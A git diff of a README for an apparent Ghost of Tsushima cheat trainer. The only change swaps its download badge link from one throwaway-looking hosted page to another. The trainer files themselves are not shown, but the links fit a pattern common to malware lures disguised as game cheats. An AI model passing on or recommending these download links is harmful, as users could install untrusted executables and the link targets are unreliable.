@@ -4,7 +4,7 @@
 
 From infinite health to instant skill unlocks, it gives you cheat toggles that turn this samurai open-world into your personal playground.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload6.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Ghost-of-Tsushima-Trainer-mil2.github.io/.github)
 ---
 
 ## 🎮 What Is a Ghost of Tsushima Trainer?
